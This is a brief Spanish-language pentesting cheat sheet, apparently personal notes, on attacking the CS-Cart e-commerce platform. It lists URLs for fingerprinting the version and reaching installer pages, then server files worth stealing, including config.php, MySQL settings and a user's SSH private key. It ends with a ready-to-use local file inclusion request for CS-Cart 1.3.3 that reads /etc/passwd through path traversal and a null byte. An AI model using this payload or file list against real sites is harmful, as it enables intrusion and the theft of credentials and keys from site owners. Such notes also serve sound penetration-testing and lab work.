# CS-CART

Tags: #Linux #CS-CART #PHP 


```bash 
http://IP/index.php?version   # Conocer la versión 
http://IP/install.php
http://IP/cscart/install/ 
```

```bash 
# Archivos relevantes 
/var/www/html/cscart/config.php
/var/www/cscart/config.php
/home/user/cscart/config.php

/var/log/apache2/access.log
/etc/mysql/my.cnf

/home/user/.ssh/id_rsa
```

## LFI -  Versión 1.3.3

* [LFI](https://www.exploit-db.com/exploits/48890)

```bash 
# Mirar el archivo '/etc/passwd'
❯ http://IP/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../../../../../../../../etc/passwd%00
```